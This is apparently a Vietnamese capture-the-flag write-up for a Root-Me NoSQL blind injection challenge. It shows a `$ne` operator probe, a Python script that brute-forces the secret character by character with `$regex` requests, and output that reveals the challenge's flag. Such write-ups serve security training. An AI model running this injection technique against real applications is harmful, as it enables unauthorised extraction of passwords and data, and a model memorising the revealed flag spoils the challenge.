Bài này là sự kết hợp kiến thức của 2 bài đã làm: `nosql injection` và `sql-injeciton-blind` . Các bước:

- Khi nhập thử payloads quen thuộc: `chall_name=nosqlblind&flag[$ne]=1`, trang web trả về `Yeah this is the flag for nosqlblind!`, đây chính là dấu hiệu của nosqli

- Viết code để brute force password:

  ```python
  import requests
  import urllib3
  import string
  import urllib
  urllib3.disable_warnings()
  
  username = 'nosqlblind'
  password = ''
  u = 'http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]='
  
  while True:
      for c in string.printable:
          if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
              payload = '^%s' % (password + c)
              r = requests.get(u + payload)
              if 'Yeah' in r.text:
                  print("Found one more char : %s" % (password+c))
                  password += c
  
  ```

  Chạy code và password sẽ dần được hiển thị ra:

  ```
  Found one more char : 3
  Found one more char : 3@
  Found one more char : 3@s
  Found one more char : 3@sY
  Found one more char : 3@sY_
  Found one more char : 3@sY_n
  Found one more char : 3@sY_n0
  Found one more char : 3@sY_n0_
  Found one more char : 3@sY_n0_5
  Found one more char : 3@sY_n0_5q
  Found one more char : 3@sY_n0_5q7
  Found one more char : 3@sY_n0_5q7_
  Found one more char : 3@sY_n0_5q7_1
  Found one more char : 3@sY_n0_5q7_1n
  Found one more char : 3@sY_n0_5q7_1nj
  Found one more char : 3@sY_n0_5q7_1nj3
  Found one more char : 3@sY_n0_5q7_1nj3c
  Found one more char : 3@sY_n0_5q7_1nj3c7
  Found one more char : 3@sY_n0_5q7_1nj3c71
  Found one more char : 3@sY_n0_5q7_1nj3c710
  Found one more char : 3@sY_n0_5q7_1nj3c710n
  ```